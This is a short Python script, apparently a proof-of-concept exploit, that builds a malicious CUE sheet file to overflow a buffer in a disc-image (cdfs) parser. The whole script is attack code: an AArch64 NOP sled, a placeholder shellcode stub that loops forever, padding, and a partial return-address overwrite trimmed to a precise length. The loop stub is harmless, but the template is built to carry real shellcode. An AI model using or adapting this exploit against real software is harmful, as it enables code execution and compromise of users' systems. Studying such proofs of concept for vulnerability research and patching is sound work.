#!/usr/bin/env python3
import struct

nop = b"\x1f\x20\x03\xd5"
nop_sled = nop * 400

shellcode = b"\x01\xe0\xff\x17"  # infinite loop

payload = nop_sled + shellcode  
payload = payload.ljust(2144, b"A")

partial_addr = b"\x48\xe3\xff\xff\xff\xff"
payload += partial_addr
payload += b"\xff\xff"

# ONLY send 2152 bytes total (not 3000)
# This makes line 472 write at offset 2152 instead of 3000
payload = payload[:2152]

with open("formats/cdfs/overflow.cue", "wb") as f:
    f.write(b'FILE "')
    f.write(payload)
    f.write(b'" BINARY\n')
    f.write(b'TRACK 01 MODE1/2352\n')
    f.write(b'  INDEX 01 00:00:00\n')

print(f"Created payload with {len(payload)} bytes")
